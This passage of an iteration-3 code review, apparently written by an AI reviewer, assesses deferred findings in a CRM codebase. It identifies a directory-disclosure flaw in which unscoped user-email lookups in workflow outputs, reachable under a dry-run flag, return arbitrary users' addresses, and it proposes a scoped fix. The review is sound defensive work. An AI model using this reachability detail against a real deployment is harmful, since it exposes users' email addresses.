so scoping them changes duplicate volume rather than producing a warning; the `allStages` read is
genuinely a third shape because `stages` has no owner column and `getDefaultStage()` reads
`pipelines` unscoped, so scoping the match without the default really would make two paths disagree
about one import; and deals having neither auto-creation nor a dedup subsystem is exactly why CR-03's
own query was contained. Leaving three known-unscoped reads open is uncomfortable, but the entry
says so plainly, names the blast radius with numbers, and hands over a plan shape rather than a
vague "revisit". That is the right way to defer.

**The `pipedrive-api-import-actions.ts` disagreement — I agree with the fixer, against the
iteration-2 review.** That importer writes `ownerId: pdOrg.owner_id` → `orgData.ownerId`
(`:737`/`:766`) and repeats the pattern for people, deals and activities: it recreates a multi-user
Pipedrive account, mapping Pipedrive owners onto Pipelite users, so its dedupe is cross-owner **by
design** and scoping it to the importing user would duplicate every record belonging to another
mapped user. CR-03 was wrong to list it as "same unscoped dedupe, narrower reach". Recording the
disagreement in the deferral rather than quietly complying was the right call.

**TS-48-A — defensible.** `noUncheckedIndexedAccess` is a whole-repo compiler-strictness change
whose blast radius is every indexed access in `src/`; it cannot be verified inside a review-fix
scope and would arrive with no test of its own. The two sites WR-10 named are fixed, both with an
explicit `| undefined` and an explicit 404, so nothing is left riding on the flag. The suggested
owner's third clause — treat each site as a decision rather than a `!` to add — is the part that
matters and it is written down. No objection.

**SEC-48-D — I disagree with the framing, and it is under-rating one of the two halves.** The entry
says: *"this is NOT an owner-boundary defect … Any signed-in user can already do the same through
the workflow editor, so an API key is not gaining a privilege the session does not have."* That is
correct for the **mail-relay** half — `{"type":"dynamic","value":"<any address>"}` with
caller-authored subject and body is equally reachable from the editor, and deciding the recipient
policy is a product question, not a predicate. It is **not** correct for the second half. Two
things the entry does not say:

1. **`resolveRecipientEmails` returns the resolved addresses in the node's `output`**
   (`email.ts:100-106`, and `notification.ts:64-75`), and those outputs are persisted as
   `workflow_run_steps.output` and served by `serializeRunStep` (`serialize.ts:226-240`). Combined
   with `select email from users where id in (…)` having no owner or self predicate
   (`email.ts:42-46`, `notification.ts:23-27`), that is not merely "readable" — it is a **read
   oracle whose answer is returned to the caller in a response body**: `recipients:
   ["victim@company.test"]` for an arbitrary `users.id`. The entry's phrase "confirms the existence
   of an arbitrary user's address" undersells it; the address itself comes back.
2. **Under `_dryRun` no mail is sent and the addresses are still returned** — `email.ts:88-97`
   returns `recipients: emails` before the send loop, and `notification.ts:62-72` gates only
   `safeSend`. So the directory-disclosure half is reachable **without** the mail-relay half, which
   means the two are separable and the recipient-policy decision does not gate fixing the read.

That second half *is* an owner-boundary defect of the same class as the rest of the phase, it is
one predicate (`eq(users.id, context._workflowUserId)`, or an explicit "users I may address" set),
and it does not need the product decision the entry is waiting on. Split SEC-48-D: keep the relay
policy as a product item, and record the unscoped `users.email` read as a scoped security item with
the dry-run reachability noted. It should not close alongside the relay question.

---

_Reviewed: 2026-08-26T09:12:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep — iteration 3_
